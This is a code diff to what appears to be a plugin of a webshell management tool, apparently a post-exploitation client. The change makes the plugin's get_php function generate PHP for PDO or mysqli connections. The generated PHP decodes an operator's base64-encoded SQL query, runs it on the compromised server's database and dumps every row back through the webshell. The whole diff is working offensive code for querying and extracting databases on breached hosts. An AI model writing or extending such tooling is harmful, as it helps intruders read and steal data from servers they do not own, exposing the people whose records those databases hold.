@@ -8,7 +8,7 @@ from libs.myapp import base64_encode, send
 from webshell_plugins.db_init import get_connect_code
 from webshell_plugins.db_use import get_php as check_database
 
-NEW_SQL_WORDLIST = {"common_wordlist": [
+NEW_SQL_WORDLIST = {"common_wordlist": (
     "use",
     "select",
     "from",
@@ -29,18 +29,36 @@ NEW_SQL_WORDLIST = {"common_wordlist": [
     "set",
     "prepare",
     "execute",
-]}
+)}
 
 
 def get_php(command, database):
-    return """%s
+    connect_type = gget("db_connect_type", "webshell")
+    connect_code = get_connect_code(dbname=database)
+    command = base64_encode(command)
+    if (connect_type == "pdo"):
+        return """try{%s
+$r=$con->query(base64_decode('%s'));
+$rows=$r->fetchAll(PDO::FETCH_ASSOC);
+foreach($rows[0] as $k=>$v){
+    echo "$k*,";
+}
+echo "\\n";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}
+} catch (PDOException $e){
+die("Connect error: ". $e->getMessage());
+}""" % (connect_code, command)
+    elif (connect_type == "mysqli"):
+        return """%s
 $r=$con->query(base64_decode('%s'));
 $rows=$r->fetch_all(MYSQLI_ASSOC);
 foreach($rows[0] as $k=>$v){
     echo "$k*,";
 }
 echo "\\n";
-foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}""" % (get_connect_code(dbname=database), base64_encode(command))
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}""" % (connect_code, command)
+    else:
+        return ""
 
 
 def execute_sql_command(command, database):
